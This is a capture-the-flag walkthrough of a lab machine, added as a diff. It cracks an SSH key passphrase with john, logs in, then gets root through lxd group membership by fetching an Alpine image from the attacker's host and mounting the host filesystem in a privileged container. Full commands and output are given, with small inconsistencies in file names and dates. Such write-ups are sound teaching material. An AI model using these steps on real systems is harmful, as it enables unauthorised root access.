@@ -1,0 +1,114 @@
+STEP 1:-
+Nmap scan results
+port 22 ssh. 80 http are open
+
+using directory enumaration find some file. here we find list of dir file and ssh key.
+using ssh2john i convert key into hash 
+ssh2john rsa.txt >> 2.txt
+and than using dir list that give by web i extract password using john
+john --wordlist=1.txt 2.txt                                                                                       
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (rsa.txt)     
+1g 0:00:00:00 DONE (2025-07-04 10:12) 25.00g/s 5550p/s 5550c/s 5550C/s changelater..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+STEP 2:-
+ssh -i 2.txt john@10.10.11.245
+load pubkey "secretKey": invalid format
+Enter passphrase for key '2.txt': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Oct 18 13:42:40 UTC 2020
+
+  System load:  0.0               Processes:           97
+  Usage of /:   41.1% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.11.245
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+john@exploitable:~$ 
+
+
+john@exploitable:~$ ls
+user.txt
+john@exploitable:~$ cat user.txt
+a5c2ff8b9c2###################
+john@exploitable:~$ 
+
+So this room is about a gaming server,so what we can do is try looking out for lxd.
+
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+john@exploitable:~$ 
+
+As you can see this user belongs to a group - lxd(108)
+
+Here's a link to a great explanation of lxd privilege escalation
+
+
+https://github.com/saghul/lxd-alpine-builder
+Download this.
+
+john@exploitable:/tmp$ wget http://10.9.81.62:1234/alpine-v3.12-x86_64-20201017_2243.tar.gz
+--2020-10-18 13:58:06--  http://10.9.81.62:1234/alpine-v3.12-x86_64-20201017_2243.tar.gz
+Connecting to 10.9.81.62:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3175707 (3.0M) [application/gzip]
+Saving to: ‘alpine-v3.12-x86_64-20201017_2243.tar.gz’
+
+alpine-v3.12-x86_64-20201017_2243.tar.gz            100%[================================================================================================================>]   3.03M   593KB/s    in 11s     
+
+2020-10-18 13:58:17 (286 KB/s) - ‘alpine-v3.12-x86_64-20201017_2243.tar.gz’ saved [3175707/3175707]
+
+john@exploitable:/tmp$ 
+
+lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias akshay
+
+
+john@exploitable:/tmp$ lxc image import alpine-v3.12-x86_64-20201017_2243.tar.gz --alias akshay
+Image imported with fingerprint: ed4dcd2f38da7e1cb95aeb404882fccd8cacc3e9695db33d6d3632ad6f810e83
+john@exploitable:/tmp$ 
+
+john@exploitable:/tmp$ lxc init akshay gg -c security.privileged=true
+Creating gg
+john@exploitable:/tmp$ lxc config device add gg mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to gg
+john@exploitable:/tmp$ lxc start gg
+john@exploitable:/tmp$ lxc exec gg /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # 
+
+~ # cd /mnt
+/mnt # cd root
+/mnt/root # ls
+bin             dev             initrd.img      lib64           mnt             root            snap            sys             var
+boot            etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
+cdrom           home            lib             media           proc            sbin            swap.img        usr             vmlinuz.old
+/mnt/root # cd root
+/mnt/root/root # ls
+root.txt
+/mnt/root/root # cat root.txt
+2e337b8c9f3a####################
+/mnt/root/root # 
+
+Thank you. Happy Hacking :)
+
+-Voker2311
